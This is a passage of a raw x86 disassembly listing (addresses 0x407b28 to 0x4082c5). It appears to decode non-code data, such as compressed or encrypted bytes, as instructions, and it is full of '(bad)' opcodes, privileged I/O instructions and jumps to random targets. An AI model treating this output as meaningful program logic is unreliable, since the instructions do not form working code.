  407b28:	lods   al,BYTE PTR ds:[esi]
  407b29:	es out 0x30,al
  407b2c:	icebp  
  407b2d:	adc    al,0xfb
  407b2f:	jae    0x407b2f
  407b31:	sbb    BYTE PTR [eax+0x12f50dd6],bh
  407b37:	aam    0x74
  407b39:	mov    edi,0x2a281229
  407b3e:	aam    0xe1
  407b40:	and    DWORD PTR [ebx-0x763efa2f],0x43
  407b47:	pop    ebp
  407b48:	in     eax,0x6f
  407b4a:	dec    ebp
  407b4b:	add    ecx,DWORD PTR fs:[edi]
  407b4e:	pop    esi
  407b4f:	scas   eax,DWORD PTR es:[edi]
  407b50:	jmp    0x94d0815a
  407b55:	sbb    cl,ch
  407b57:	jo     0x407af0
  407b59:	(bad)  
  407b5a:	push   ecx
  407b5b:	inc    ecx
  407b5c:	xchg   esp,eax
  407b5d:	stos   BYTE PTR es:[edi],al
  407b5e:	cmp    DWORD PTR [esi+esi*1],edx
  407b61:	jmp    0x57ba:0xafc26dc1
  407b68:	sub    DWORD PTR [edi+0x66],ecx
  407b6b:	mov    dh,0xa1
  407b6d:	icebp  
  407b6e:	inc    esp
  407b6f:	inc    ebx
  407b70:	(bad)  [eax+0x5c58d37e]
  407b76:	int3   
  407b77:	jb     0x407b95
  407b79:	neg    DWORD PTR [edi-0x3d]
  407b7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b7d:	enter  0x6824,0x75
  407b81:	pop    ebx
  407b82:	sar    al,1
  407b84:	add    al,0xae
  407b86:	int    0x36
  407b88:	push   esi
  407b89:	sbb    eax,0xb2d013e2
  407b8e:	(bad)  
  407b8f:	(bad)  
  407b91:	loop   0x407b20
  407b93:	repnz sar ebp,cl
  407b96:	pop    esi
  407b97:	mov    cl,0xb5
  407b99:	and    dh,BYTE PTR [ebx+0x59cc8d65]
  407b9f:	fimul  DWORD PTR [esi-0x89c8dfd]
  407ba5:	pop    ss
  407ba6:	pop    ebp
  407ba7:	(bad)  
  407ba8:	mov    cl,0x91
  407baa:	hlt    
  407bab:	push   0x616ab4a9
  407bb0:	fcomp  QWORD PTR [ecx]
  407bb2:	retf   0x58c7
  407bb5:	fidivr WORD PTR fs:[ebp+edi*2-0x5e]
  407bba:	xchg   esp,eax
  407bbb:	(bad)  
  407bbc:	aas    
  407bbd:	scas   eax,DWORD PTR es:[edi]
  407bbe:	popf   
  407bbf:	ror    BYTE PTR ds:0x165eb436,1
  407bc5:	test   eax,0x2de5dab9
  407bca:	adc    bh,ch
  407bcc:	mov    eax,ds:0x63a65775
  407bd1:	(bad)  
  407bd3:	nop
  407bd4:	mov    ds:0x384d5742,eax
  407bd9:	stos   BYTE PTR es:[edi],al
  407bda:	bound  edx,QWORD PTR [edx]
  407bdc:	iret   
  407bdd:	ds push esi
  407bdf:	test   BYTE PTR [ebx+0x4e],ah
  407be2:	mov    eax,0xcd021672
  407be7:	sbb    BYTE PTR ds:0x655ba58a,bh
  407bed:	div    DWORD PTR [esi+0x5f58e8d9]
  407bf3:	ds aaa 
  407bf5:	jmp    0x407c45
  407bf7:	stc    
  407bf8:	mov    cl,0x39
  407bfa:	cwde   
  407bfb:	xlat   BYTE PTR ds:[ebx]
  407bfc:	dec    eax
  407bfd:	push   0x69b802f4
  407c02:	popf   
  407c03:	add    DWORD PTR [ebp-0x2bedf82e],esp
  407c09:	ret    
  407c0a:	dec    ebp
  407c0b:	mov    al,ds:0x7b16675
  407c10:	repnz sub DWORD PTR [ebx+0x20],esp
  407c14:	add    al,0x4e
  407c16:	ja     0x407bd4
  407c18:	(bad)  
  407c1a:	nop
  407c1b:	popf   
  407c1c:	inc    ecx
  407c1d:	clc    
  407c1e:	sub    DWORD PTR [edx+0x49],eax
  407c21:	shl    DWORD PTR [ebx-0x6f],1
  407c24:	ret    
  407c25:	mul    cl
  407c27:	lea    edi,[ebx+0x30]
  407c2a:	mov    ecx,0xeee39c6a
  407c2f:	(bad)  
  407c30:	fadd   QWORD PTR [esi-0x35]
  407c33:	mov    dh,0x99
  407c35:	in     eax,0x8
  407c37:	std    
  407c38:	push   esp
  407c39:	mov    dh,0x99
  407c3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c3c:	fwait
  407c3d:	pop    ecx
  407c3e:	inc    ecx
  407c3f:	sub    DWORD PTR [ecx+ecx*1],0xb00ba2f3
  407c46:	test   BYTE PTR [edi],cl
  407c48:	gs jecxz 0x407c41
  407c4b:	outs   dx,DWORD PTR ds:[esi]
  407c4c:	test   BYTE PTR [edx-0x71c92a9],al
  407c52:	(bad)  
  407c53:	jmp    0x407c97
  407c55:	stos   DWORD PTR es:[edi],eax
  407c56:	loopne 0x407c68
  407c58:	in     al,dx
  407c59:	push   cs
  407c5a:	sbb    al,0x19
  407c5c:	mov    ds:0xe2e7a715,eax
  407c61:	inc    ebx
  407c62:	cmp    DWORD PTR [eax-0x1ef8f470],edi
  407c68:	jg     0x407c1c
  407c6a:	stos   BYTE PTR es:[edi],al
  407c6b:	xor    DWORD PTR [edx+0x76],esi
  407c6e:	mov    bl,0xfe
  407c70:	jl     0x407c02
  407c72:	fcom   QWORD PTR [eax+0x2f]
  407c75:	sbb    eax,DWORD PTR [ecx]
  407c77:	out    0x38,eax
  407c79:	lods   al,BYTE PTR fs:[esi]
  407c7b:	adc    BYTE PTR [eax+0x54],0x31
  407c7f:	call   0xe6742e3e
  407c84:	addr16 pop eax
  407c86:	bound  esi,QWORD PTR [esi]
  407c88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c89:	mov    ?,WORD PTR ds:[esi-0x41]
  407c8d:	and    cl,0xd6
  407c90:	sar    edx,cl
  407c92:	add    BYTE PTR ds:0xcd003500,al
  407c98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c99:	pop    ebp
  407c9a:	cmc    
  407c9b:	push   eax
  407c9c:	lea    eax,[ebp+0x671b6b27]
  407ca2:	sar    DWORD PTR [esi+edi*2+0x3d],1
  407ca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ca7:	(bad)  
  407ca8:	mov    esp,0x27ee31b7
  407cad:	jmp    DWORD PTR ds:0x9dabdb32
  407cb3:	int3   
  407cb4:	mov    eax,ds:0x7b408458
  407cb9:	cdq    
  407cba:	cmp    bh,BYTE PTR ds:0xacd83267
  407cc0:	pop    ebp
  407cc1:	mov    ds:0xf97a4e70,eax
  407cc6:	in     al,dx
  407cc7:	mov    dl,0x3a
  407cc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cca:	xor    esp,DWORD PTR [eax]
  407ccc:	rcl    ch,1
  407cce:	pusha  
  407ccf:	(bad)  
  407cd0:	shr    DWORD PTR [edx+0x46],1
  407cd3:	les    ebx,FWORD PTR [ebx+0xcae27b]
  407cd9:	cmp    DWORD PTR [ecx+eiz*4-0x5a7f5ce4],eax
  407ce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ce1:	std    
  407ce2:	fbld   TBYTE PTR [edi-0x11]
  407ce5:	mul    DWORD PTR [ebp+0x2c]
  407ce8:	jecxz  0x407c79
  407cea:	hlt    
  407ceb:	pop    eax
  407cec:	pop    DWORD PTR [ebx+0x65932831]
  407cf2:	call   0x8d79:0x7ecb1748
  407cf9:	sbb    al,bl
  407cfb:	mov    fs,WORD PTR [edi+0x16a4d3cc]
  407d01:	mov    cs,WORD PTR [esi+eax*4+0x5c]
  407d05:	(bad)  
  407d06:	sub    edx,DWORD PTR [esi-0x3ed0040b]
  407d0c:	or     al,0x8c
  407d0e:	lods   al,BYTE PTR ds:[esi]
  407d0f:	inc    ebp
  407d10:	mov    eax,ds:0x9924e712
  407d15:	xchg   ebp,eax
  407d16:	ret    
  407d17:	sub    ecx,DWORD PTR ds:0x508d2787
  407d1d:	call   0x38b8:0x3bcd4eda
  407d24:	mov    ch,0x26
  407d26:	inc    eax
  407d27:	mov    ch,0x59
  407d29:	inc    esp
  407d2a:	pop    ebp
  407d2b:	xor    al,0xfd
  407d2d:	dec    si
  407d2f:	call   0x929c:0xe8fa12b2
  407d36:	bound  esp,QWORD PTR [ebx+0xdb259a6]
  407d3c:	xor    eax,DWORD PTR [edi+0x1d]
  407d3f:	cmp    edi,DWORD PTR [edx-0xb]
  407d42:	ins    DWORD PTR es:[edi],dx
  407d43:	int3   
  407d44:	sub    al,BYTE PTR ss:[eax+0x0]
  407d48:	and    ecx,DWORD PTR [esp+esi*2+0x18]
  407d4c:	cmc    
  407d4d:	mov    edx,0x5b43256a
  407d52:	mov    eax,ds:0xf1c9d376
  407d57:	adc    bl,BYTE PTR [ebp-0x71]
  407d5a:	and    dl,BYTE PTR [edi-0x5a232601]
  407d60:	xchg   edi,eax
  407d61:	xor    BYTE PTR [edx+0x2d],0x2b
  407d65:	push   ebx
  407d66:	pop    ds
  407d67:	out    0xd0,al
  407d69:	test   BYTE PTR [eax+0x52],ch
  407d6c:	adc    DWORD PTR [edi+0x78],esp
  407d6f:	fs push cs
  407d71:	add    ebp,DWORD PTR [edi]
  407d73:	fadd   DWORD PTR [ecx]
  407d75:	xor    DWORD PTR [ecx-0x38a4dcba],edi
  407d7b:	lea    ebx,[edi]
  407d7d:	pop    ecx
  407d7e:	test   DWORD PTR [eax-0x1fe3c398],edx
  407d84:	mov    ds:0x638fffe3,eax
  407d89:	fcmovb st,st(6)
  407d8b:	sub    al,0xb
  407d8d:	xchg   ebp,eax
  407d8e:	xchg   esi,eax
  407d8f:	fsub   DWORD PTR [esi+0x6cd95f30]
  407d95:	mov    WORD PTR [eax+0x19],?
  407d98:	iret   
  407d99:	call   0xd39749b4
  407d9e:	into   
  407d9f:	stos   DWORD PTR es:[edi],eax
  407da0:	test   BYTE PTR [eax+0x10],dh
  407da3:	fisttp DWORD PTR [ebp-0x774d007]
  407da9:	push   esp
  407daa:	xchg   bl,cl
  407dac:	mov    ds:0xd5ed966d,al
  407db1:	cmp    ebx,esp
  407db3:	dec    ecx
  407db4:	(bad)  
  407db5:	jns    0x407db8
  407db7:	lods   al,BYTE PTR ds:[esi]
  407db8:	lods   eax,DWORD PTR ds:[esi]
  407db9:	jg     0x407d41
  407dbb:	mov    edx,0xf84bbf6f
  407dc0:	std    
  407dc1:	push   0xffffffc2
  407dc3:	in     eax,dx
  407dc4:	or     ebx,DWORD PTR [eax]
  407dc6:	mov    dh,0xd3
  407dc8:	mov    ah,0x6c
  407dca:	test   DWORD PTR [edx],edx
  407dcc:	lahf   
  407dcd:	dec    edi
  407dce:	add    eax,0xbbb24d7a
  407dd3:	test   DWORD PTR [ebx+0x54f4889c],ecx
  407dd9:	fcmovbe st,st(2)
  407ddb:	add    DWORD PTR [ebx-0x4f],ebp
  407dde:	sub    DWORD PTR [ecx-0x394118eb],eax
  407de4:	xchg   edx,eax
  407de5:	cmp    eax,DWORD PTR [esi+0x4de3c496]
  407deb:	or     al,bl
  407ded:	mov    cl,0x3c
  407def:	inc    BYTE PTR [edi+0x74]
  407df2:	and    BYTE PTR [ecx+0xf],ah
  407df5:	out    0xe3,eax
  407df7:	test   al,0xb2
  407df9:	or     al,0x48
  407dfb:	frstor [ebp-0x73e0510]
  407e01:	mov    bl,0x4a
  407e03:	push   ecx
  407e04:	pop    ds
  407e05:	fcom   DWORD PTR [ecx+0x44]
  407e08:	push   ebp
  407e09:	sbb    DWORD PTR ss:0xa4749828,eax
  407e10:	mov    DWORD PTR [ebx+0x3402e955],eax
  407e16:	push   eax
  407e17:	cwde   
  407e18:	mov    ah,0xd
  407e1a:	push   ecx
  407e1b:	adc    ah,0x29
  407e1e:	fld    QWORD PTR [esi+0x5e73ff1e]
  407e24:	adc    eax,0x650634ed
  407e29:	ficom  WORD PTR [edi*4-0x655638cd]
  407e30:	test   BYTE PTR [edx-0x3c],0xe0
  407e34:	mov    DWORD PTR [eax-0x6cb07b8d],eax
  407e3a:	daa    
  407e3b:	pop    eax
  407e3c:	cmp    BYTE PTR [edx+0x7d5f4787],dl
  407e42:	int3   
  407e43:	mov    bl,0xcb
  407e45:	xor    edx,DWORD PTR [eax-0x6d00959e]
  407e4b:	inc    esi
  407e4c:	mov    eax,ds:0x1bfbf686
  407e51:	sbb    al,0x19
  407e54:	cmp    al,0x54
  407e56:	cmp    BYTE PTR [ebx],dl
  407e58:	or     al,0x32
  407e5a:	xchg   esi,eax
  407e5b:	sbb    al,BYTE PTR [ebx+0x3c]
  407e5e:	adc    al,0x14
  407e60:	pop    edx
  407e61:	dec    edi
  407e62:	aas    
  407e63:	pop    ebx
  407e64:	test   eax,0xfd9b703b
  407e69:	lahf   
  407e6a:	test   dh,cl
  407e6c:	xor    ah,BYTE PTR [esi-0x3153890a]
  407e72:	inc    eax
  407e73:	cmp    dh,BYTE PTR [ecx+0x39]
  407e76:	cmp    eax,0xaddf45b6
  407e7b:	xor    DWORD PTR [ebx+0x53632e03],edx
  407e81:	xchg   edi,eax
  407e82:	test   BYTE PTR [ebx+edx*1],al
  407e85:	(bad)  
  407e87:	ficomp WORD PTR [esi+0x72bf8167]
  407e8d:	(bad)  
  407e8e:	mov    ebp,0x87f1d15d
  407e93:	fldenv [ecx-0x59]
  407e96:	sbb    bl,bl
  407e98:	dec    esp
  407e99:	outs   dx,DWORD PTR ds:[esi]
  407e9a:	std    
  407e9b:	in     al,dx
  407e9c:	sti    
  407e9d:	or     esp,DWORD PTR [ecx-0x2fd262a5]
  407ea3:	fcom   QWORD PTR [edi]
  407ea5:	mov    edi,0xe049b1c5
  407eaa:	fcom   DWORD PTR [edx+0x20]
  407ead:	lods   eax,DWORD PTR ds:[esi]
  407eae:	stos   BYTE PTR es:[edi],al
  407eaf:	aad    0x8c
  407eb1:	mov    cl,0x2f
  407eb3:	mov    ah,0x9
  407eb5:	call   0x943166ac
  407eba:	das    
  407ebb:	push   ebx
  407ebc:	sub    eax,0x16b17620
  407ec1:	pop    esi
  407ec2:	out    dx,al
  407ec3:	pop    eax
  407ec4:	dec    edx
  407ec5:	jge    0x407f39
  407ec7:	js     0x407eed
  407ec9:	inc    eax
  407eca:	daa    
  407ecb:	sbb    al,0xbc
  407ecd:	sahf   
  407ece:	or     bh,BYTE PTR [edx]
  407ed0:	mov    bl,0x7b
  407ed2:	stos   BYTE PTR es:[edi],al
  407ed3:	mov    ecx,0x90870c07
  407ed8:	lods   al,BYTE PTR ds:[esi]
  407ed9:	mov    ecx,0xc648d844
  407ede:	imul   esi,DWORD PTR [ecx-0x305ce181],0x54b41213
  407ee8:	stos   DWORD PTR es:[edi],eax
  407ee9:	call   0xb4b0:0xe085d125
  407ef0:	(bad)  
  407ef2:	dec    esp
  407ef3:	cmp    esp,DWORD PTR [edi+0x51]
  407ef6:	pop    ss
  407ef7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ef8:	cmp    edi,0x7089d7e4
  407efe:	popf   
  407eff:	push   ecx
  407f00:	fisub  DWORD PTR [esi-0x63cb563e]
  407f06:	test   al,0x79
  407f08:	call   0x9f556604
  407f0d:	aaa    
  407f0e:	adc    esi,edi
  407f10:	mov    esi,DWORD PTR [si]
  407f13:	sar    BYTE PTR [ebp-0x54],1
  407f16:	leave  
  407f17:	mov    dh,0x28
  407f19:	pop    edx
  407f1a:	and    esp,DWORD PTR [eax+eax*4+0x3230bdc8]
  407f21:	push   ebp
  407f22:	cmp    al,0xad
  407f24:	xor    DWORD PTR ds:0x84329871,eax
  407f2a:	cmp    BYTE PTR [ebx*4+0x53688bb6],bh
  407f31:	inc    BYTE PTR [esi+0xa603fe8]
  407f37:	mov    ch,0x9c
  407f39:	pop    ebx
  407f3a:	mov    ebx,0xefeea962
  407f3f:	clc    
  407f40:	mov    ebx,0xe2995c90
  407f45:	sti    
  407f46:	fst    QWORD PTR [esi-0x3679d9a6]
  407f4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f4d:	jg     0x407f5e
  407f4f:	adc    al,cl
  407f51:	scas   eax,DWORD PTR es:[edi]
  407f52:	inc    edx
  407f53:	adc    dh,al
  407f55:	mov    edi,0x3d4c3b96
  407f5a:	inc    edi
  407f5b:	or     DWORD PTR [eax],esp
  407f5d:	push   esp
  407f5e:	stc    
  407f5f:	xchg   esp,eax
  407f60:	test   eax,0x61d64265
  407f65:	fnstenv [edi+0x9]
  407f68:	hlt    
  407f69:	mov    al,ds:0xe4908e82
  407f6e:	idiv   edx
  407f70:	popf   
  407f71:	and    DWORD PTR [edx+ebx*2+0x7f7ecac6],edx
  407f78:	(bad)  
  407f79:	xchg   edx,eax
  407f7a:	ficom  WORD PTR [eax]
  407f7c:	mov    ecx,0xeda9c30d
  407f81:	or     bl,BYTE PTR [ecx+eiz*8-0x7d]
  407f85:	jge    0x407f98
  407f87:	jno    0x407fda
  407f89:	ret    0x11c0
  407f8c:	dec    ecx
  407f8d:	cmp    BYTE PTR [edx-0x75],ah
  407f90:	dec    ebx
  407f91:	mov    dl,0x59
  407f93:	pop    esi
  407f94:	jns    0x407fdf
  407f96:	int    0xcf
  407f98:	add    al,BYTE PTR [ecx]
  407f9a:	cli    
  407f9b:	ds int 0x83
  407f9e:	test   DWORD PTR [eax],edx
  407fa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fa1:	dec    edi
  407fa2:	jg     0x407f3e
  407fa4:	(bad)  
  407fa5:	icebp  
  407fa6:	(bad)  
  407fa7:	pop    eax
  407fa8:	pop    ecx
  407fa9:	fldcw  WORD PTR [ebp-0x5d]
  407fac:	rcl    BYTE PTR [eax-0x7d],0xc1
  407fb0:	and    al,0x47
  407fb2:	lods   al,BYTE PTR ds:[esi]
  407fb3:	xchg   esi,eax
  407fb4:	out    0x21,eax
  407fb6:	(bad)  
  407fb7:	pusha  
  407fb8:	or     BYTE PTR [ebp+edi*1-0x1542a344],bh
  407fbf:	hlt    
  407fc0:	pop    ss
  407fc1:	add    BYTE PTR [eax],bh
  407fc3:	mov    bh,0x0
  407fc5:	dec    esp
  407fc6:	mov    ebp,0x9de74d90
  407fcb:	ss xchg esi,eax
  407fcd:	push   ebx
  407fce:	aaa    
  407fcf:	in     eax,0xfb
  407fd1:	stos   DWORD PTR es:[edi],eax
  407fd2:	jb     0x40801f
  407fd4:	ss int3 
  407fd6:	in     al,0x34
  407fd8:	ds sahf 
  407fda:	sub    DWORD PTR [edx-0x9002753],edx
  407fe0:	mov    cl,0x97
  407fe2:	mov    ah,0xb5
  407fe4:	aad    0x47
  407fe6:	out    0x38,al
  407fe8:	xor    eax,0xd94f14e3
  407fed:	push   edx
  407fee:	xchg   BYTE PTR [ecx+0x20ab1835],dl
  407ff4:	in     eax,dx
  407ff5:	test   BYTE PTR [ebx],dl
  407ff7:	pop    ds
  407ff8:	pop    ecx
  407ff9:	clc    
  407ffa:	(bad)  
  407ffb:	neg    DWORD PTR [ebp+eiz*2+0x1937c499]
  408002:	inc    esi
  408003:	rcr    DWORD PTR [ebx-0xf],1
  408006:	test   DWORD PTR [ebp+0x1d86eb33],ebx
  40800c:	xchg   esp,eax
  40800d:	push   esp
  40800e:	jne    0x408056
  408010:	add    BYTE PTR [edi],0xb4
  408013:	ins    DWORD PTR es:[edi],dx
  408014:	call   0xaab75d31
  408019:	js     0x407fb4
  40801b:	pushf  
  40801c:	test   BYTE PTR [ebp+0x1c],ch
  40801f:	jae    0x40801c
  408021:	fidiv  DWORD PTR [ecx+0x50]
  408024:	pop    ebx
  408025:	fwait
  408026:	pop    ss
  408027:	pusha  
  408028:	jnp    0x408022
  40802a:	outs   dx,BYTE PTR ds:[esi]
  40802b:	in     eax,0xcf
  40802d:	or     al,0x48
  40802f:	mov    ds:0x6181a295,eax
  408034:	lds    esp,FWORD PTR [eax-0x2f11ccb0]
  40803a:	sub    ch,BYTE PTR [ebx+0x7b8a3246]
  408040:	sbb    edi,DWORD PTR [ecx-0x7e]
  408043:	or     al,0x3f
  408045:	add    esp,DWORD PTR [eax+0x2a]
  408048:	(bad)  
  408049:	mov    bl,BYTE PTR [esi+0x7298fe68]
  40804f:	jnp    0x4080be
  408051:	fldcw  WORD PTR [ebx+0x70]
  408054:	retf   
  408055:	push   esp
  408056:	mov    ds:0x2c315ef2,eax
  40805b:	pop    esp
  40805c:	or     BYTE PTR [ecx-0x5c],ah
  40805f:	xchg   edi,eax
  408060:	lahf   
  408061:	xchg   ebx,eax
  408062:	inc    ebx
  408063:	mov    DWORD PTR [ecx+0x8],ebx
  408066:	push   es
  408067:	xor    esi,ecx
  408069:	sbb    dl,BYTE PTR [ebx]
  40806b:	xor    BYTE PTR [edi],cl
  40806d:	xchg   BYTE PTR [edx-0x2864ecfa],ch
  408073:	cmc    
  408074:	xor    BYTE PTR [esi+0x68],dl
  408077:	pop    edx
  408078:	inc    edx
  408079:	pusha  
  40807a:	jg     0x4080eb
  40807c:	test   DWORD PTR [ebx],0xc07b9a58
  408082:	push   0x999d3e92
  408087:	(bad)  
  408088:	popf   
  408089:	pop    ds
  40808a:	fbld   TBYTE PTR [edi]
  40808c:	popf   
  40808d:	jmp    FWORD PTR [ebp-0x705a6cae]
  408093:	jg     0x408092
  408095:	imul   esp,DWORD PTR ds:0x5c95a3ac,0xa7540679
  40809f:	jns    0x4080d9
  4080a1:	pop    eax
  4080a2:	sbb    eax,0xcfdef0b8
  4080a7:	dec    edx
  4080a8:	sbb    DWORD PTR [ebx+eiz*1],esi
  4080ab:	inc    ebp
  4080ac:	mov    edi,0xbbde4f19
  4080b1:	stos   DWORD PTR es:[edi],eax
  4080b2:	mov    cl,0x54
  4080b4:	lods   al,BYTE PTR ds:[esi]
  4080b5:	(bad)  
  4080b6:	pop    esp
  4080b7:	out    dx,eax
  4080b8:	scas   eax,DWORD PTR es:[edi]
  4080b9:	cmp    al,0xdb
  4080bb:	mov    edi,0xa1bdebe7
  4080c0:	ins    DWORD PTR es:[edi],dx
  4080c1:	scas   eax,DWORD PTR es:[edi]
  4080c2:	sbb    ecx,ecx
  4080c4:	inc    edx
  4080c5:	xchg   edx,eax
  4080c6:	pop    eax
  4080c7:	fmulp  st(0),st
  4080c9:	in     al,dx
  4080ca:	call   DWORD PTR [edx+esi*2-0x50]
  4080ce:	rcr    DWORD PTR [esi-0x20849b33],1
  4080d4:	sbb    ch,bl
  4080d6:	xchg   ebp,eax
  4080d7:	fwait
  4080d8:	repz jnp 0x4080f1
  4080db:	cmp    edx,DWORD PTR [ecx+eax*2+0x5a]
  4080df:	daa    
  4080e0:	push   esp
  4080e1:	pushf  
  4080e2:	mov    BYTE PTR [ebx+0x41],bh
  4080e5:	aam    0xcd
  4080e7:	(bad)  
  4080e8:	adc    eax,DWORD PTR [esi]
  4080ea:	test   DWORD PTR [ebp+eiz*1-0x5bb2a39b],ecx
  4080f1:	stc    
  4080f2:	fisttp DWORD PTR [ebx+ebp*2]
  4080f5:	mov    ds:0x56ff8e35,eax
  4080fa:	shr    BYTE PTR [ebx+0x7aa63925],1
  408100:	push   edx
  408101:	xor    esi,DWORD PTR [eax-0x492d5dec]
  408107:	data16 sbb ch,BYTE PTR [eax+0x1338a1fa]
  40810e:	mov    eax,0x3cb3f80f
  408113:	call   0x38b3:0xdaa9c49c
  40811a:	adc    DWORD PTR [edi],0xffffffd2
  40811d:	push   es
  40811e:	sahf   
  40811f:	fcom   QWORD PTR gs:[ecx+0x69f8ade0]
  408126:	cli    
  408127:	mov    cl,0x7
  408129:	dec    edi
  40812a:	xchg   esp,eax
  40812b:	add    BYTE PTR [esi+edi*4-0x16],dh
  40812f:	inc    edi
  408130:	adc    DWORD PTR [ebx-0x70],ebp
  408133:	dec    eax
  408134:	ror    BYTE PTR [ebp-0x16],1
  408137:	inc    esp
  408138:	lods   al,BYTE PTR ds:[esi]
  408139:	sahf   
  40813a:	sbb    bh,BYTE PTR [eax]
  40813c:	sub    eax,0x6a1149f
  408141:	loopne 0x40812f
  408143:	scas   al,BYTE PTR es:[edi]
  408144:	xlat   BYTE PTR ds:[ebx]
  408145:	fnstcw WORD PTR [ebx-0x4d1c3e14]
  40814b:	imul   BYTE PTR [edx]
  40814d:	mov    esp,0xd5811158
  408152:	aaa    
  408153:	mov    dl,0x88
  408155:	jb     0x4081bb
  408157:	or     bl,BYTE PTR [ecx]
  408159:	xchg   esi,eax
  40815a:	popa   
  40815b:	dec    edi
  40815c:	cdq    
  40815d:	sbb    DWORD PTR [edi+eax*8],ebx
  408160:	out    0xc5,eax
  408162:	int3   
  408163:	mov    BYTE PTR gs:[eax+0x5670141e],ah
  40816a:	sub    DWORD PTR [edi+ebp*4-0x6e],ebp
  40816e:	addr16 ret 0x7f0b
  408172:	push   ecx
  408173:	int3   
  408174:	sbb    ebx,edx
  408176:	mov    DWORD PTR [edx+0x4d3236b1],ecx
  40817c:	stos   DWORD PTR es:[edi],eax
  40817d:	and    edx,DWORD PTR [ebx]
  40817f:	mov    ebx,0x84dcf11c
  408184:	test   DWORD PTR [esp+edx*8+0x329316f0],eax
  40818b:	cmp    DWORD PTR [edi+0x7d27aa56],0x5a
  408192:	mov    ecx,0x75923b05
  408197:	fiadd  DWORD PTR ds:0xf78b4cf
  40819d:	ins    BYTE PTR es:[edi],dx
  40819e:	sub    bl,BYTE PTR [edx+0x9b389b9]
  4081a4:	cwde   
  4081a5:	mov    al,ds:0x1b293478
  4081aa:	ret    0x46eb
  4081ad:	jmp    0xbf02208e
  4081b2:	lahf   
  4081b3:	add    eax,DWORD PTR [eax-0x42]
  4081b6:	or     bl,BYTE PTR [ebp+0x76]
  4081b9:	retf   0x2bca
  4081bc:	cmc    
  4081bd:	fimul  WORD PTR [eax+0x4d5691ab]
  4081c3:	es in  al,dx
  4081c5:	icebp  
  4081c6:	int    0x23
  4081c8:	shl    BYTE PTR [ebx],cl
  4081ca:	pop    esi
  4081cb:	xor    BYTE PTR [eax+esi*8],al
  4081ce:	int    0xc9
  4081d0:	jbe    0x408223
  4081d2:	sub    al,0x1c
  4081d4:	dec    edx
  4081d5:	pop    esi
  4081d6:	aam    0xa7
  4081d8:	xchg   DWORD PTR [esp+ecx*1],edx
  4081db:	xchg   DWORD PTR [eax+edi*8-0x2],ebp
  4081df:	repnz cmp DWORD PTR [ebp+esi*1+0x4a],edi
  4081e4:	dec    ebp
  4081e5:	jbe    0x40820f
  4081e7:	pusha  
  4081e8:	or     eax,0xea8e8a28
  4081ed:	outs   dx,DWORD PTR ds:[esi]
  4081ee:	pop    ecx
  4081ef:	cs add ecx,eax
  4081f2:	xchg   edx,eax
  4081f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081f4:	fidivr DWORD PTR [edi]
  4081f6:	je     0x40823e
  4081f8:	xchg   ebp,eax
  4081f9:	les    esp,FWORD PTR [eax+eiz*1-0x32bd35bb]
  408200:	arpl   WORD PTR [eax],cx
  408202:	jae    0x408210
  408204:	bound  edx,QWORD PTR [ebx]
  408206:	mov    eax,0x235cadfe
  40820b:	mov    ebx,DWORD PTR [ebp+0x5b547734]
  408211:	out    0x72,al
  408213:	shr    BYTE PTR [edx+0x6d],cl
  408216:	mov    ch,0x2d
  408218:	fcomp  DWORD PTR [ecx+0x323938ab]
  40821e:	mov    ecx,0xfe2bb486
  408223:	rol    DWORD PTR [ebp+0x202993c2],1
  408229:	inc    edi
  40822a:	retf   
  40822b:	mov    al,0xad
  40822d:	xchg   DWORD PTR [esi-0x3b],eax
  408230:	fistp  WORD PTR [esi]
  408232:	mov    ebp,0x307e3298
  408237:	(bad)  
  408238:	pop    edx
  408239:	arpl   WORD PTR [eax+0x6d],dx
  40823c:	repz push edx
  40823e:	imul   edi,DWORD PTR [ebx+eiz*2],0x85f2aedf
  408245:	lods   eax,DWORD PTR ds:[esi]
  408246:	cs jmp 0x4081e3
  408249:	out    dx,al
  40824a:	scas   eax,DWORD PTR es:[edi]
  40824b:	(bad)  
  40824d:	(bad)  
  40824e:	xlat   BYTE PTR ds:[ebx]
  40824f:	xor    bh,BYTE PTR ds:0xbdc26789
  408255:	popf   
  408256:	add    eax,0x98345f69
  40825b:	fcomp  DWORD PTR [ecx-0x616d68a8]
  408261:	stc    
  408262:	inc    ebp
  408263:	test   al,0x3f
  408265:	jns    0x40821a
  408267:	aam    0xbe
  408269:	icebp  
  40826a:	arpl   WORD PTR [edi+0x72],si
  40826d:	jns    0x408252
  40826f:	pop    esi
  408270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408271:	mov    ecx,0x96d6a7df
  408276:	das    
  408277:	outs   dx,DWORD PTR ds:[esi]
  408278:	test   bh,al
  40827a:	int3   
  40827b:	clc    
  40827c:	iret   
  40827d:	add    ebp,esp
  40827f:	stos   DWORD PTR es:[edi],eax
  408280:	xchg   edx,eax
  408281:	pop    ss
  408282:	in     eax,0x7a
  408284:	xlat   BYTE PTR ds:[ebx]
  408285:	sub    esp,DWORD PTR [eax-0x37d5a7f5]
  40828b:	(bad)  
  40828d:	test   al,0xa2
  40828f:	test   eax,0x6b9e1bfd
  408294:	inc    ebp
  408295:	jne    0x40827b
  408297:	push   ebp
  408298:	jbe    0x408254
  40829a:	add    DWORD PTR [ebx-0x27bcb5a4],ecx
  4082a0:	and    ebx,ebx
  4082a2:	je     0x4082b0
  4082a4:	xor    ecx,esi
  4082a6:	jl     0x40830c
  4082a8:	data16 int3 
  4082aa:	aas    
  4082ab:	jno    0x408324
  4082ad:	cli    
  4082ae:	(bad)
  4082b1:	jnp    0x4082d0
  4082b3:	(bad)
  4082b6:	sub    eax,0x5858284d
  4082bb:	fcmovne st,st(0)
  4082bd:	xlat   BYTE PTR ds:[ebx]
  4082be:	cmp    ah,BYTE PTR [eax]
  4082c0:	in     al,0xcd
  4082c2:	and    DWORD PTR [edx-0x1f],esi
  4082c5:	push   es
